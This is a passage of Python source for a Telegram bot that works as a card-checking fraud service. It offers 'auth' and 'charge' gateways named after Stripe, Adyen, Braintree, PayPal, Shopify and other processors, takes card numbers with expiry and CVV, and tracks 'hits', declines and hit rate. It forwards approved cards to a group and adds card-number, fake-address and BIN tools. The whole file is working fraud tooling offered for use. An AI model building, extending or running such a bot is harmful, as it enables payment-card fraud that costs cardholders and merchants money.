            bot.edit_message_text(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                text=registration_message,
                reply_markup=reply_markup,
                parse_mode='HTML'
            )
        
        elif call.data == "commands":
            if not is_user_registered(user.id):
                bot.answer_callback_query(call.id, "Please register first!", show_alert=True)
                return
            show_commands_menu(call)
        
        elif call.data == "auth":
            show_auth_menu(call)
        
        elif call.data == "charge":
            show_charge_menu(call)
        
        elif call.data == "high_charge":
            show_high_charge_menu(call)
        
        elif call.data == "tools":
            show_tools_menu(call)
        
        elif call.data == "back":
            welcome_message = f"""<blockquote>⌬ OnyxEnv | By @onyxEnvSupportBot</blockquote>
<blockquote>Upgrading...</blockquote>
━━━━━━━━━━━━━━━━
✅️ <a href="tg://user?id={user.id}">{user.first_name}</a>
<blockquote>How Are You?</blockquote>
👤 Your UserID - <code>{user.id}</code>
<blockquote>BOT Status - Live!!!</blockquote>"""
            
            keyboard = [[types.InlineKeyboardButton("Register", callback_data="register"), types.InlineKeyboardButton("Commands", callback_data="commands")]]
            if user.id in ADMINS:
                keyboard.append([types.InlineKeyboardButton("Admin Panel", callback_data="admin_panel")])
            
            reply_markup = types.InlineKeyboardMarkup(keyboard)
            bot.edit_message_text(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                text=welcome_message,
                reply_markup=reply_markup,
                parse_mode='HTML'
            )
        
        elif call.data == "admin_panel":
            if user.id in ADMINS:
                show_admin_panel(call)
            else:
                bot.answer_callback_query(call.id, "⚠️ You are not an admin!", show_alert=True)
        
        elif call.data == "admin_broadcast":
            if user.id in ADMINS:
                msg = bot.send_message(call.message.chat.id, "Send broadcast message:")
                bot.register_next_step_handler(msg, process_broadcast)
        
        elif call.data == "admin_ban":
            if user.id in ADMINS:
                msg = bot.send_message(call.message.chat.id, "Send user ID to ban:")
                bot.register_next_step_handler(msg, process_ban)
        
        elif call.data == "admin_unban":
            if user.id in ADMINS:
                msg = bot.send_message(call.message.chat.id, "Send user ID to unban:")
                bot.register_next_step_handler(msg, process_unban)
        
        elif call.data == "admin_addgroup":
            if user.id in ADMINS:
                msg = bot.send_message(call.message.chat.id, "Send group ID for APPROVED cards:")
                bot.register_next_step_handler(msg, process_addgroup)
        
        elif call.data == "admin_declinegroup":
            if user.id in ADMINS:
                msg = bot.send_message(call.message.chat.id, "Send group ID for DECLINED cards:")
                bot.register_next_step_handler(msg, process_declinegroup)
        
        elif call.data == "admin_dashboard":
            if user.id in ADMINS:
                show_dashboard(call)
        
        elif call.data == "admin_users":
            if user.id in ADMINS:
                send_users_data_from_callback(call)
        
        elif call.data == "admin_gateways":
            if user.id in ADMINS:
                show_gateway_management(call)
        
        elif call.data == "admin_setapi":
            if user.id in ADMINS:
                msg = bot.send_message(call.message.chat.id, "Send command and API URL:\nFormat: /command api_url\n\nExample: /chk http://127.0.0.1:8070/key=yashikaaa/cc=")
                bot.register_next_step_handler(msg, process_setapi)
        
        elif call.data.startswith("toggle_gateway_"):
            if user.id in ADMINS:
                gateway_key = call.data.replace("toggle_gateway_", "")
                toggle_gateway(call, gateway_key)
        
        elif call.data in ["/ca", "/ab", "/ady", "/chk", "/bt", "/na", "/pp"]:
            show_command_info(call, call.data)
        
        elif call.data in ["/st", "/mo", "/ppf", "/mp", "/sc", "/cl", "/ss"]:
            show_command_info(call, call.data)
        
        elif call.data in ["/shc", "/skb"]:
            show_command_info(call, call.data)
        
        elif call.data in ["/gen", "/fake", "/bin"]:
            show_tool_info(call, call.data)
    
    except Exception as e:
        logger.error(f"Error: {e}")
        bot.answer_callback_query(call.id, "Error occurred.", show_alert=True)

def process_broadcast(message):
    if message.from_user.id not in ADMINS:
        return
    
    broadcast_message = message.text
    try:
        with open(REGISTERED_USERS_FILE, 'r') as f:
            users = f.read().splitlines()
            total = len(users)
            success = 0
            
            for user_line in users:
                try:
                    user_id = user_line.split(',')[0]
                    bot.send_message(user_id, f"📢 Broadcast:\n{broadcast_message}")
                    success += 1
                    time.sleep(0.1)
                except Exception as e:
                    logger.error(f"Error sending to user {user_id}: {e}")
            
            bot.reply_to(message, f"Broadcast sent to {success}/{total} users.")
    except Exception as e:
        bot.reply_to(message, f"Error: {e}")

def process_ban(message):
    if message.from_user.id not in ADMINS:
        return
    
    user_id = message.text.strip()
    try:
        with open(BANNED_USERS_FILE, 'a') as f:
            f.write(f"{user_id}\n")
        bot.reply_to(message, f"✅ User {user_id} banned.")
    except Exception as e:
        bot.reply_to(message, f"Error: {e}")

def process_unban(message):
    if message.from_user.id not in ADMINS:
        return
    
    user_id = message.text.strip()
    try:
        with open(BANNED_USERS_FILE, 'r') as f:
            banned_users = [line.strip() for line in f.readlines() if line.strip() != user_id]
        
        with open(BANNED_USERS_FILE, 'w') as f:
            f.write('\n'.join(banned_users))
        
        bot.reply_to(message, f"✅ User {user_id} unbanned.")
    except Exception as e:
        bot.reply_to(message, f"Error: {e}")

def process_addgroup(message):
    if message.from_user.id not in ADMINS:
        return
    
    group_id = message.text.strip()
    try:
        with open(APPROVED_GROUP_FILE, 'w') as f:
            f.write(group_id)
        bot.reply_to(message, f"✅ Approved group set to {group_id}")
    except Exception as e:
        bot.reply_to(message, f"Error: {e}")

def process_declinegroup(message):
    if message.from_user.id not in ADMINS:
        return
    
    group_id = message.text.strip()
    try:
        with open(DECLINED_GROUP_FILE, 'w') as f:
            f.write(group_id)
        bot.reply_to(message, f"✅ Declined group set to {group_id}")
    except Exception as e:
        bot.reply_to(message, f"Error: {e}")

def process_setapi(message):
    if message.from_user.id not in ADMINS:
        return
    
    try:
        parts = message.text.split(maxsplit=1)
        if len(parts) < 2:
            bot.reply_to(message, "⚠️ Format: /command api_url\n\nExample: /chk http://127.0.0.1:8070/key=yashikaaa/cc=")
            return
        
        command = parts[0].lower()
        api_url = parts[1].strip()
        
        save_custom_api(command, api_url)
        bot.reply_to(message, f"✅ API set for {command}\n\nNew URL: {api_url}")
    except Exception as e:
        bot.reply_to(message, f"Error: {e}")

def send_users_data_from_callback(call):
    try:
        with open(REGISTERED_USERS_FILE, 'r') as f:
            users = f.read().splitlines()
        
        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        filename = f"users_data_{timestamp}.txt"
        
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(f"REGISTERED USERS - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write("=" * 50 + "\n\n")
            for i, user_line in enumerate(users, 1):
                parts = user_line.split(',')
                user_id = parts[0] if len(parts) > 0 else 'Unknown'
                username = parts[1] if len(parts) > 1 else 'no_username'
                name = parts[2] if len(parts) > 2 else 'Unknown'
                f.write(f"{i}. ID: {user_id}\n")
                f.write(f"   Username: @{username}\n")
                f.write(f"   Name: {name}\n")
                f.write("-" * 30 + "\n")
            f.write(f"\nTotal Users: {len(users)}")
        
        with open(filename, 'rb') as f:
            bot.send_document(
                call.message.chat.id,
                f,
                caption=f"📊 Users Data\nTotal: {len(users)} users"
            )
        
        os.remove(filename)
        bot.answer_callback_query(call.id, "Users data sent!", show_alert=False)
    except Exception as e:
        bot.answer_callback_query(call.id, f"Error: {e}", show_alert=True)

def show_dashboard(call):
    total_users = 0
    total_hits = 0
    total_declines = 0
    
    try:
        with open(REGISTERED_USERS_FILE, 'r') as f:
            total_users = len(f.read().splitlines())
    except:
        pass
    
    try:
        with open(HITS_FILE, 'r') as f:
            total_hits = len(f.read().splitlines())
    except:
        pass
    
    try:
        with open(DECLINES_FILE, 'r') as f:
            total_declines = len(f.read().splitlines())
    except:
        pass
    
    dashboard_text = f"""📊 DASHBOARD
━━━━━━━━━━━━━━━━━━
👥 Users: {total_users}
✅ Hits: {total_hits}
❌ Declines: {total_declines}
📈 Hit Rate: {round((total_hits / (total_hits + total_declines) * 100) if (total_hits + total_declines) > 0 else 0, 2)}%
━━━━━━━━━━━━━━━━━━"""
    
    keyboard = [[types.InlineKeyboardButton("Back", callback_data="admin_panel")]]
    reply_markup = types.InlineKeyboardMarkup(keyboard)
    
    bot.edit_message_text(
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        text=dashboard_text,
        reply_markup=reply_markup,
        parse_mode='HTML'
    )

def show_gateway_management(call):
    keyboard = []
    
    keyboard.append([types.InlineKeyboardButton("AUTH", callback_data="noop")])
    for cmd, gateway in GATEWAY_CONFIG.get('auth', {}).items():
        status = "ON" if gateway.get('enabled', True) else "OFF"
        keyboard.append([types.InlineKeyboardButton(f"{gateway['name']} [{status}]", callback_data=f"toggle_gateway_{cmd}")])
    
    keyboard.append([types.InlineKeyboardButton("LOW CHARGE", callback_data="noop")])
    for cmd, gateway in GATEWAY_CONFIG.get('charge_low', {}).items():
        status = "ON" if gateway.get('enabled', True) else "OFF"
        keyboard.append([types.InlineKeyboardButton(f"{gateway['name']} [{status}]", callback_data=f"toggle_gateway_{cmd}")])
    
    keyboard.append([types.InlineKeyboardButton("HIGH CHARGE", callback_data="noop")])
    for cmd, gateway in GATEWAY_CONFIG.get('charge_high', {}).items():
        status = "ON" if gateway.get('enabled', True) else "OFF"
        keyboard.append([types.InlineKeyboardButton(f"{gateway['name']} [{status}]", callback_data=f"toggle_gateway_{cmd}")])
    
    keyboard.append([types.InlineKeyboardButton("Set API", callback_data="admin_setapi")])
    keyboard.append([types.InlineKeyboardButton("Back", callback_data="admin_panel")])
    
    reply_markup = types.InlineKeyboardMarkup(keyboard)
    
    bot.edit_message_text(
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        text="GATEWAY MANAGEMENT\nClick to toggle ON/OFF",
        reply_markup=reply_markup
    )

def toggle_gateway(call, gateway_key):
    toggled = False
    for category in ['auth', 'charge_low', 'charge_high']:
        if gateway_key in GATEWAY_CONFIG.get(category, {}):
            current = GATEWAY_CONFIG[category][gateway_key].get('enabled', True)
            GATEWAY_CONFIG[category][gateway_key]['enabled'] = not current
            toggled = True
            break
    
    if toggled:
        with open(GATEWAY_CONFIG_FILE, 'w') as f:
            json.dump(GATEWAY_CONFIG, f, indent=4)
        bot.answer_callback_query(call.id, "Gateway toggled!", show_alert=False)
        show_gateway_management(call)
    else:
        bot.answer_callback_query(call.id, "Gateway not found!", show_alert=True)

def show_admin_panel(call):
    keyboard = [
        [types.InlineKeyboardButton("Dashboard", callback_data="admin_dashboard")],
        [types.InlineKeyboardButton("Users Data", callback_data="admin_users")],
        [types.InlineKeyboardButton("Gateways", callback_data="admin_gateways")],
        [types.InlineKeyboardButton("Broadcast", callback_data="admin_broadcast")],
        [types.InlineKeyboardButton("Ban User", callback_data="admin_ban")],
        [types.InlineKeyboardButton("Unban User", callback_data="admin_unban")],
        [types.InlineKeyboardButton("Approved Group", callback_data="admin_addgroup")],
        [types.InlineKeyboardButton("Declined Group", callback_data="admin_declinegroup")],
        [types.InlineKeyboardButton("Set API", callback_data="admin_setapi")],
        [types.InlineKeyboardButton("Back", callback_data="back")]
    ]
    reply_markup = types.InlineKeyboardMarkup(keyboard)
    
    approved_group = get_approved_group()
    declined_group = get_declined_group()
    
    status_text = f"""ADMIN PANEL
━━━━━━━━━━━━━━━━━━
✅ Approved: {approved_group if approved_group else 'Not set'}
❌ Declined: {declined_group if declined_group else 'Not set'}
━━━━━━━━━━━━━━━━━━"""
    
    try:
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text=status_text,
            reply_markup=reply_markup,
            parse_mode='HTML'
        )
    except Exception as e:
        logger.error(f"Error: {e}")

def show_commands_menu(call):
    keyboard = [
        [types.InlineKeyboardButton("Auth", callback_data="auth"), types.InlineKeyboardButton("Charge", callback_data="charge")],
        [types.InlineKeyboardButton("High Charge", callback_data="high_charge"), types.InlineKeyboardButton("Tools", callback_data="tools")],
        [types.InlineKeyboardButton("Back", callback_data="back")]
    ]
    reply_markup = types.InlineKeyboardMarkup(keyboard)
    bot.edit_message_text(
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        text="Select a category:",
        reply_markup=reply_markup,
        parse_mode='HTML'
    )

def show_auth_menu(call):
    keyboard = [
        [types.InlineKeyboardButton("Chaos", callback_data="/ca"), types.InlineKeyboardButton("App Based", callback_data="/ab")],
        [types.InlineKeyboardButton("Adyen", callback_data="/ady"), types.InlineKeyboardButton("Stripe", callback_data="/chk")],
        [types.InlineKeyboardButton("Braintree", callback_data="/bt"), types.InlineKeyboardButton("Arcenus", callback_data="/na")],
        [types.InlineKeyboardButton("Paypal", callback_data="/pp")],
        [types.InlineKeyboardButton("Back", callback_data="commands")]
    ]
    reply_markup = types.InlineKeyboardMarkup(keyboard)
    bot.edit_message_text(
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        text="Auth Gateways:",
        reply_markup=reply_markup,
        parse_mode='HTML'
    )

def show_charge_menu(call):
    keyboard = [
        [types.InlineKeyboardButton("Stripe", callback_data="/st"), types.InlineKeyboardButton("Moneris", callback_data="/mo")],
        [types.InlineKeyboardButton("PayFlow", callback_data="/ppf"), types.InlineKeyboardButton("MoonPay", callback_data="/mp")],
        [types.InlineKeyboardButton("CyberSource", callback_data="/sc"), types.InlineKeyboardButton("Clover", callback_data="/cl")],
        [types.InlineKeyboardButton("Square+Stripe", callback_data="/ss")],
        [types.InlineKeyboardButton("Back", callback_data="commands")]
    ]
    reply_markup = types.InlineKeyboardMarkup(keyboard)
    bot.edit_message_text(
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        text="Low Charge Gateways:",
        reply_markup=reply_markup,
        parse_mode='HTML'
    )

def show_high_charge_menu(call):
    keyboard = [
        [types.InlineKeyboardButton("Shopify $15", callback_data="/shc")],
        [types.InlineKeyboardButton("SK Based $98.7", callback_data="/skb")],
        [types.InlineKeyboardButton("Back", callback_data="commands")]
    ]
    reply_markup = types.InlineKeyboardMarkup(keyboard)
    bot.edit_message_text(
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        text="High Charge Gateways:",
        reply_markup=reply_markup,
        parse_mode='HTML'
    )

def show_tools_menu(call):
    keyboard = [
        [types.InlineKeyboardButton("Gen", callback_data="/gen")],
        [types.InlineKeyboardButton("Fake", callback_data="/fake")],
        [types.InlineKeyboardButton("Bin", callback_data="/bin")],
        [types.InlineKeyboardButton("Back", callback_data="commands")]
    ]
    reply_markup = types.InlineKeyboardMarkup(keyboard)
    bot.edit_message_text(
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        text="Tools:",
        reply_markup=reply_markup,
        parse_mode='HTML'
    )

def show_command_info(call, command):
    gateway_name = get_gateway_name(command)
    message = f"""{gateway_name} Command
━━ ━ ━ ━ ━ ━ ━ ━ ━ ━━
Format: {command} cc|mm|yyyy|cvv
Example: {command} 4111111111111111|12|2026|123
Status: Live"""
    
    if command in ['/ca', '/ab', '/ady', '/chk', '/bt', '/na', '/pp']:
        back_to = "auth"
    elif command in ['/st', '/mo', '/ppf', '/mp', '/sc', '/cl', '/ss']:
        back_to = "charge"
    else:
        back_to = "high_charge"
    
    keyboard = [[types.InlineKeyboardButton("Back", callback_data=back_to)]]
    reply_markup = types.InlineKeyboardMarkup(keyboard)
    
    bot.edit_message_text(
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        text=message,
        reply_markup=reply_markup,
        parse_mode='HTML'
    )

def show_tool_info(call, command):
    if command == '/gen':
        message = """Card Generator
━━ ━ ━ ━ ━ ━ ━ ━ ━ ━━
Format: /gen BIN|MM|YY|CVV
Examples:
/gen 57117
/gen 57117|15|xxx|157
Status: Live"""
    elif command == '/fake':
        message = """Fake Address Generator
━━ ━ ━ ━ ━ ━ ━ ━ ━ ━━
Format: /fake [country]
Examples:
/fake
/fake us
/fake canada
Status: Live"""
    else:
        message = """BIN Checker
━━ ━ ━ ━ ━ ━ ━ ━ ━ ━━
Format: /bin 6digit
Examples:
/bin 57117
/bin 521729
Status: Live"""
    
    keyboard = [[types.InlineKeyboardButton("Back", callback_data="tools")]]
    reply_markup = types.InlineKeyboardMarkup(keyboard)
    
    bot.edit_message_text(
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        text=message,
        reply_markup=reply_markup,
        parse_mode='HTML'
    )

# Gateway Configuration
GATEWAY_CONFIG = {
    "auth": {
        "/ca": {"name": "Chaos Auth", "url": "http://127.0.0.1:7161/key=yashikaaa/cc=", "enabled": True},
        "/ab": {"name": "App Based Auth", "url": "http://127.0.0.1:7661/key=yashikaaa/cc=", "enabled": True},
        "/ady": {"name": "Adyen Auth", "url": "http://127.0.0.1:9670/key=yashikaaa/cc=", "enabled": True},
        "/chk": {"name": "Stripe Auth", "url": "http://127.0.0.1:8070/key=yashikaaa/cc=", "enabled": True},
        "/bt": {"name": "Braintree Auth", "url": "http://127.0.0.1:8080/key=yashikaaa/c=c", "enabled": True},
        "/na": {"name": "Arcenus Auth", "url": "http://127.0.0.1:7675/key=yashikaaa/cc=", "enabled": True},
        "/pp": {"name": "Paypal Auth", "url": "http://127.0.0.1:7771/key=yashikaaa/cc=", "enabled": True}
    },
    "charge_low": {
        "/st": {"name": "Stripe $0.01", "url": "http://127.0.0.1:7221/key=yashikaaa/cc=", "enabled": True},
        "/mo": {"name": "Moneris $0.01", "url": "http://127.0.0.1:8221/key=yashikaaa/cc=", "enabled": True},
        "/ppf": {"name": "PayFlow $0.01", "url": "http://127.0.0.1:4451/key=yashikaaa/cc=", "enabled": True},
        "/mp": {"name": "MoonPay $0.01", "url": "http://127.0.0.1:5561/key=yashikaaa/cc=", "enabled": True},
        "/sc": {"name": "CyberSource $0.01", "url": "http://127.0.0.1:3341/key=yashikaaa/cc=", "enabled": True},
        "/cl": {"name": "Clover $0.01", "url": "http://127.0.0.1:4431/key=yashikaaa/cc=", "enabled": True},
        "/ss": {"name": "Square+Stripe $0.001", "url": "http://127.0.0.1:5521/key=yashikaaa/cc=", "enabled": True}
    },
    "charge_high": {
        "/shc": {"name": "Shopify Custom $15", "url": "http://127.0.0.1:9745/key=yashikaaa/cc=", "enabled": True},
        "/skb": {"name": "SK Based $98.7", "url": "http://127.0.0.1:3132/key=yashikaaa/cc=", "enabled": True}
    }
}

# Load saved gateway config
try:
    with open(GATEWAY_CONFIG_FILE, 'r') as f:
        saved_config = json.load(f)
        for category in saved_config:
            if category in GATEWAY_CONFIG:
                for cmd in saved_config[category]:
                    if cmd in GATEWAY_CONFIG[category]:
                        GATEWAY_CONFIG[category][cmd]['enabled'] = saved_config[category][cmd].get('enabled', True)
except:
    pass

# Start the bot
logger.info("Bot starting...")
try:
    bot.delete_webhook()
    bot.infinity_polling(timeout=80, long_polling_timeout=80)
except Exception as e:
    logger.error(f"Bot error: {e}")
